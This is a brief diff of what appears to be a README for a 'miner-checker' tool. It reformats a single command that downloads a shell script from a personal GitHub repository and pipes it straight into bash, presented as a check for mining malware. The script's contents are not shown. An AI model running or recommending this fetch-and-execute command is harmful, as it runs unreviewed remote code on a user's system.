@@ -6,4 +6,4 @@ Supported systems:
  + Centos
 
 Check your system for miner-virus:
-``bash <(curl -s https://raw.githubusercontent.com/Just-234exv/miner-checker/main/script.sh)``
+```bash <(curl -s https://raw.githubusercontent.com/Just-234exv/miner-checker/main/script.sh)```
